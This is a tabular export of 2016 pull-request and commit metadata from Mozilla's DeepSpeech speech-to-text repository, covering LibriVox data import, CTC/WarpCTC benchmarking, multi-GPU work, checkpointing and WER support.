4523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc3f96e56a54b9e2b99e48f6978b65dd8fc26d4,Add code to download/extract/format LibriSpeech corpus data
4524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f1a80a039533e68e9b78e80f2f7807c038f3ea2,Make sure we don't delete the converted data when running the importer for a second time
4525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea7fc63654e56430b21c531d527068ad139be853,Fix Python 2 incompatibilities and convert transcriptions to lower case when saving
4526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cf8231e299eec963becbeac886f1fed76d9585b,Strip line endings from transcription files
4527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08e3a5b3d0a477c474cd9f1118b5c0e480b3cfe9,Use SoX instead of pydub for converting to WAV.
4528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/51,51,Issue37 multigpu,"issue #37 
",lissyx,1645737,2016-10-07T16:03:25Z,COLLABORATOR,False,12376,22,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83aaa6730d4e0cdab347c1cf4b45b4a899163c5a,Code to benchmark CTC/WarpCTC on DeepSpeech notebook
4529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/50,50,Fixed issue #2 and issue #4,"@andrenatal could you review this
@reuben this is the branch the [LibriVox](http://librivox.org/) loading code issue #47 and #46  should be based off of
",kdavis-mozilla,12054740,2016-10-05T20:36:33Z,CONTRIBUTOR,False,930,5451,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d6755d93d557659ee610f9ed7b5eb5fa164d505,Fix of issue #23
4530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/50,50,Fixed issue #2 and issue #4,"@andrenatal could you review this
@reuben this is the branch the [LibriVox](http://librivox.org/) loading code issue #47 and #46  should be based off of
",kdavis-mozilla,12054740,2016-10-05T20:36:33Z,CONTRIBUTOR,False,930,5451,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8fdafe60b468c6db05bf6f02b6da26455738ddf,Fix #16; Logging activations and gradients
4531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/50,50,Fixed issue #2 and issue #4,"@andrenatal could you review this
@reuben this is the branch the [LibriVox](http://librivox.org/) loading code issue #47 and #46  should be based off of
",kdavis-mozilla,12054740,2016-10-05T20:36:33Z,CONTRIBUTOR,False,930,5451,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,410e0d2f411e772d925cf7efa88661c4d321f2c7,Added checkpointing
4532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/50,50,Fixed issue #2 and issue #4,"@andrenatal could you review this
@reuben this is the branch the [LibriVox](http://librivox.org/) loading code issue #47 and #46  should be based off of
",kdavis-mozilla,12054740,2016-10-05T20:36:33Z,CONTRIBUTOR,False,930,5451,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f04025911e1d31675238535f2e70105ede81eec8,Fixed issue #2 and issue #4
4533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c85a37d29ec2579ec6647406895c35472195b53c,Fix #48; separation of training and validation
4534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,122c27c6a2446ca82689f9ff2f37e0d70e5502da,Fix #11; WER support
4535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,147ca6bde169c46131be8c5b6e24b6d4ca7bfb1b,"Fix #12; integration of WER in training, validation and test"
4536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2892feb0acc266daa0c8e2ff1a21ef8592ca9149,Logging context and hyper parameters to JSON file
4537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2890264b040d1341b82929c7ce337966dc65a527,Merging a central JS data file that can be loaded by the report page
4538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3439b72d563f42e0bee7d9ed02af792435778cd,Fixed dropout handling and other fixes
4539,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9fb60a7ebc01a01819cf3f75c2428a71fee500c2,Reintroduced feed_dict for context dependent dropout rates
4540,https://api.github.com/repos/mozilla/DeepSpeech/pulls/49,49,Fix #48; separation of training and validation,,tilmankamp,5991088,2016-10-05T15:02:20Z,CONTRIBUTOR,True,1221,334,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3abc9d92af460d8265cc550436e555c9c7194fc,"Merge of pull requests #49, #50, and #52. Fixes issues #2, #4, #11, #12, #46, #47, and #48"
4541,https://api.github.com/repos/mozilla/DeepSpeech/pulls/45,45,Benchmarking CTC/WarpCTC,,lissyx,1645737,2016-10-03T14:19:18Z,COLLABORATOR,False,117069,0,172,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddec7f6060e292f2d834f810b01bf03f73003062,Code to benchmark CTC/WarpCTC
4542,https://api.github.com/repos/mozilla/DeepSpeech/pulls/45,45,Benchmarking CTC/WarpCTC,,lissyx,1645737,2016-10-03T14:19:18Z,COLLABORATOR,False,117069,0,172,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d37baff2dcaef4a8c96cb54e659ae61f0059fad,"Benchmark results

Scripts to reproduce benchmark with results and charts.

Closes #37."
4543,https://api.github.com/repos/mozilla/DeepSpeech/pulls/44,44,Added checkpointing,"Added checkpointing, more complicated model persistence should wait until TensorFlow Serving is integrated as it imposes other specifications on serialization.
",kdavis-mozilla,12054740,2016-09-28T12:16:06Z,CONTRIBUTOR,True,17,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b312639fe7efa26e7c6dbdbd1292f4a4909ba63,Added checkpointing
4544,https://api.github.com/repos/mozilla/DeepSpeech/pulls/43,43,Fix of issue #23,"@tilmankamp Can you take a look at this?

We'll have to merge our pull requests, but it doesn't look like it will be too hard to merge them.
",kdavis-mozilla,12054740,2016-09-26T08:36:17Z,CONTRIBUTOR,True,488,5277,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26035f3626ac22f117b304c80c192a4faab21c1e,Fix of issue #23
4545,https://api.github.com/repos/mozilla/DeepSpeech/pulls/43,43,Fix of issue #23,"@tilmankamp Can you take a look at this?

We'll have to merge our pull requests, but it doesn't look like it will be too hard to merge them.
",kdavis-mozilla,12054740,2016-09-26T08:36:17Z,CONTRIBUTOR,True,488,5277,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dcdf3d0a1790dcf43a6f6f8e29febf0a95106b5,Fix #16; Logging activations and gradients
4546,https://api.github.com/repos/mozilla/DeepSpeech/pulls/42,42,Fix #16 - histograms of activations and gradients,"@kdavis-mozilla : Please review
",tilmankamp,5991088,2016-09-23T12:17:30Z,CONTRIBUTOR,False,96,5067,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8febfd4f07de436882b4efbf6b0e1a15c10645b,Fix #16 - histograms of activations and gradients
4547,https://api.github.com/repos/mozilla/DeepSpeech/pulls/41,41,Added LICENSE,,kdavis-mozilla,12054740,2016-09-20T17:13:17Z,CONTRIBUTOR,True,373,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea38c6834410f891810a89ef8acedadd594967a9,Added LICENSE
4548,https://api.github.com/repos/mozilla/DeepSpeech/pulls/38,38,WIP Integration of CTC,"Just so master has working code
",kdavis-mozilla,12054740,2016-09-20T08:11:50Z,CONTRIBUTOR,True,5434,940,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9eebe98aa96736287b7bdf69e486451189bb1532,Adding CTC to notebook
4549,https://api.github.com/repos/mozilla/DeepSpeech/pulls/38,38,WIP Integration of CTC,"Just so master has working code
",kdavis-mozilla,12054740,2016-09-20T08:11:50Z,CONTRIBUTOR,True,5434,940,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,615e6df5cf3a749bd2eb1bc703fff5e1c0246cb1,Merge branch 'issue6' of https://github.com/mozilla/DeepSpeech into issue6
4550,https://api.github.com/repos/mozilla/DeepSpeech/pulls/36,36,Prep for milestones 1 and 4,"Several small changes in prep for [CTC integration](https://github.com/mozilla/DeepSpeech/milestone/1), [Adam optimizer integration](https://www.tensorflow.org/versions/r0.10/api_docs/python/train.html#AdamOptimizer), [TED-LIUM integration](https://github.com/mozilla/DeepSpeech/milestone/4)…
- General cleaning
- Change text to refer to [MFCC](https://en.wikipedia.org/wiki/Mel-frequency_cepstrum) features
- Made placeholder `y` of proper type for CTC
- Removed `istate_fw` and `istate_bw` as, for now, we don’t use them
",kdavis-mozilla,12054740,2016-09-07T22:52:20Z,CONTRIBUTOR,True,29,43,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,311da0e80c0b7a8d191ff48de62e544fc73fcdec,Prep for milestones 1 and 4
